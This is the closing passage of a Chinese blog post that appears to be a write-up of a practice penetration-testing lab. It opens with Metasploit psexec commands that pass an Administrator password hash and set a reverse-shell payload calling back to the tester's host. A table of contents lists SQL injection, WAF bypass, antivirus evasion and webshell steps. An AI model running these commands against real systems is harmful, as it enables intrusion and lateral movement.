<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.165</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LPORT 4444</span><br><span class="line">set LHOST 192.168.1.130</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1</span><br><span class="line">set SMBDomain attack.local</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/gQrBVd3wZ4X6LKA.png" alt="image-20220130233524961" /></p>
<h6 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h6>
<p><img src="https://s2.loli.net/2022/05/19/mNMs7xiAXrcG4ub.png" alt="image-20220130233625129" /></p>
<h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2>
<p>欢迎大家加入星球一起学习、里面有各种红队资源、工具、各种小技巧啊！</p>
<p><img src="https://s2.loli.net/2022/05/18/ob3dl9ZVwQUfMGg.jpg" alt="" /></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">like4h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/23/1823398161.html">http://example.com/2022/02/23/1823398161.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">like4h</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/">暗月渗透实战靶场</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/23/3712695892.html"><img class="prev-cover" src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">暗月渗透实战靶场-项目五</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/23/3679647319.html"><img class="next-cover" src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">暗月渗透实战靶场-项目六</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/02/23/3712695892.html" title="暗月渗透实战靶场-项目五"><img class="cover" src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目五</div></div></a></div><div><a href="/2022/02/23/3679647319.html" title="暗月渗透实战靶场-项目六"><img class="cover" src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目六</div></div></a></div><div><a href="/2022/02/23/842093410.html" title="暗月渗透实战靶场-项目八"><img class="cover" src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目八</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/index/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">like4h</div><div class="author-info__description">心中有梦，眼里有光</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/like4h"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/like4h" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:flyingjq@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">like4h's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-%E9%A1%B9%E7%9B%AE%E4%B8%83"><span class="toc-number">1.</span> <span class="toc-text"> 暗月渗透实战靶场-项目七</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> 环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 设置网络环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 网络测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 外网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.1.3.3.</span> <span class="toc-text"> 域控</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 00x1-信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ip%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text"> IP确认</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> netdiscover</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#masscan"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> masscan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> nmap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whataweb%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84cms"><span class="toc-number">1.2.3.</span> <span class="toc-text"> whataweb查询网站的cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 查询网站目录信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8dirsearch"><span class="toc-number">1.2.4.1.</span> <span class="toc-text"> 使用dirsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="toc-number">1.2.4.1.1.</span> <span class="toc-text"> 小插曲</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gobuster"><span class="toc-number">1.2.4.2.</span> <span class="toc-text"> 使用gobuster</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8dirmap"><span class="toc-number">1.2.4.3.</span> <span class="toc-text"> 使用dirmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 00x2-漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#steserver%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.1.</span> <span class="toc-text"> steserver后台管理页面泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 漏洞查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 后台sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.3.1.</span> <span class="toc-text"> poc测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 安全狗绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.1.</span> <span class="toc-text"> 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.4.2.</span> <span class="toc-text"> 参考连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.4.3.</span> <span class="toc-text"> 绕过测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 查询数据库用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%B0%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.3.5.1.</span> <span class="toc-text"> 查询到用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.5.2.</span> <span class="toc-text"> 查询密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.5.3.</span> <span class="toc-text"> 查询加密方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 查询加密方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dll%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">1.3.6.1.</span> <span class="toc-text"> DLL反编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%B1%80%E7%9A%84%E6%9F%A5%E6%89%BE"><span class="toc-number">1.3.6.2.</span> <span class="toc-text"> 进行全局的查找</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E8%A7%A3%E5%AF%86"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 编写解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 后台找回密码漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%8C%85"><span class="toc-number">1.3.8.1.</span> <span class="toc-text"> 抓包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x3-%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0-%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">1.4.</span> <span class="toc-text"> 00x3-进入后台-上传shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 进入后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEwebshell%E4%B8%8A%E4%BC%A0%E7%82%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 查找webshell上传点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0webshell"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 上传webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.4.3.2.</span> <span class="toc-text"> 连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x4-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text"> 00x4-信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.1.</span> <span class="toc-text"> 主机信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ip"><span class="toc-number">1.5.1.2.</span> <span class="toc-text"> ip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.1.3.</span> <span class="toc-text"> 端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.1.4.</span> <span class="toc-text"> 开启的服务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%AF%B9%E6%88%91%E4%BB%AC%E6%8F%90%E6%9D%83%E6%9C%89%E5%B8%AE%E5%8A%A9%E6%88%96%E8%80%85%E6%98%AF%E5%8F%88%E9%98%BB%E7%A2%8D%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.1.4.1.</span> <span class="toc-text"> 查找对我们提权有帮助或者是又阻碍的服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%BB%E7%A2%8D"><span class="toc-number">1.5.1.4.2.</span> <span class="toc-text"> 阻碍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%AE%E5%8A%A9"><span class="toc-number">1.5.1.4.3.</span> <span class="toc-text"> 帮助</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.5.1.5.</span> <span class="toc-text"> 开启的进程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.5.1.5.1.</span> <span class="toc-text"> 防护进程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.6.</span> <span class="toc-text"> 查看用户信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8Amsf"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 上MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5-2"><span class="toc-number">1.5.2.1.</span> <span class="toc-text"> 连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E4%B8%AA%E9%9A%A7%E9%81%93"><span class="toc-number">1.5.2.2.</span> <span class="toc-text"> 做个隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text"> 测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%BD%AC%E5%88%B0cs"><span class="toc-number">1.5.3.</span> <span class="toc-text"> MSF转到CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x5-windows-server-2016%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text"> 00x5-Windows server-2016漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 搜索相关提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number">1.6.1.1.</span> <span class="toc-text"> 免杀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0poc"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 上传poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 制作免杀攻击载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%88%B6%E4%BD%9C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.6.4.1.</span> <span class="toc-text"> 先制作反向代理的攻击载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-number">1.6.4.2.</span> <span class="toc-text"> MSF设置监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E8%BF%9B%E8%A1%8Cshellcode%E7%BC%96%E8%AF%91"><span class="toc-number">1.6.4.3.</span> <span class="toc-text"> 攻击载荷进行shellcode编译</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8E%A9%E7%9B%AE"><span class="toc-number">1.6.4.3.1.</span> <span class="toc-text"> 使用到的工具掩目</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">1.6.4.3.2.</span> <span class="toc-text"> 编译</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80"><span class="toc-number">1.6.4.3.3.</span> <span class="toc-text"> 生成免杀</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-2"><span class="toc-number">1.6.4.4.</span> <span class="toc-text"> 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E8%A2%ABwindows%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80"><span class="toc-number">1.6.4.5.</span> <span class="toc-text"> 结果被windows杀软查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87%E9%98%B6%E6%AE%B5"><span class="toc-number">1.6.4.6.</span> <span class="toc-text"> 斗智斗勇阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%88%E4%BA%8E%E5%8A%9F%E5%A4%AB%E4%B8%8D%E8%B4%9F%E6%9C%89%E5%BF%83%E4%BA%BA"><span class="toc-number">1.6.4.7.</span> <span class="toc-text"> 终于功夫不负有心人</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.5.</span> <span class="toc-text"> 工具上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-2"><span class="toc-number">1.6.5.1.</span> <span class="toc-text"> 执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.6.6.</span> <span class="toc-text"> 再次上传攻击载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F"><span class="toc-number">1.6.6.1.</span> <span class="toc-text"> 上传成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cexe"><span class="toc-number">1.6.6.2.</span> <span class="toc-text"> 执行exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9session%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.6.7.</span> <span class="toc-text"> 成功反弹session会话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.6.7.1.</span> <span class="toc-text"> 注入系统进程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%88%B0cs"><span class="toc-number">1.6.8.</span> <span class="toc-text"> 转到CS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.6.8.1.</span> <span class="toc-text"> cs上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.6.8.2.</span> <span class="toc-text"> 转移进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x6-%E8%B8%8F%E8%BF%9B%E5%86%85%E7%BD%91"><span class="toc-number">1.7.</span> <span class="toc-text"> 00x6-踏进内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E7%BD%91%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 对内网进行信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.7.1.1.</span> <span class="toc-text"> 密码获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A53389"><span class="toc-number">1.7.1.2.</span> <span class="toc-text"> 连接3389</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2-2"><span class="toc-number">1.7.1.2.1.</span> <span class="toc-text"> 小插曲</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3"><span class="toc-number">1.7.1.2.2.</span> <span class="toc-text"> 解决</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5-3"><span class="toc-number">1.7.1.2.3.</span> <span class="toc-text"> 连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E5%8A%9F"><span class="toc-number">1.7.1.2.4.</span> <span class="toc-text"> 成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.7.1.2.5.</span> <span class="toc-text"> 任务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 跨网段信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.2.1.</span> <span class="toc-text"> 内网扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E7%BD%91ip%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.2.1.1.</span> <span class="toc-text"> 内网IP扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="toc-number">1.7.2.1.2.</span> <span class="toc-text"> 端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.7.2.1.3.</span> <span class="toc-text"> 访问80端口</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x7-%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%E5%8F%91%E7%8E%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.8.</span> <span class="toc-text"> 00x7-进入内网发现域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEoa-getshell-%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87%E6%9C%BA2"><span class="toc-number">1.8.1.</span> <span class="toc-text"> 通达OA-getshell-拿下目标机2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7-%E9%80%9A%E8%BE%BEoa"><span class="toc-number">1.8.1.1.</span> <span class="toc-text"> 直接使用工具-通达OA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%93%E9%80%9A"><span class="toc-number">1.8.1.2.</span> <span class="toc-text"> 直接打通</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%86%B0%E8%9D%8E%E9%A9%AC"><span class="toc-number">1.8.1.3.</span> <span class="toc-text"> 上传冰蝎马</span></a><ol class="toc-child"><li class="toc-item 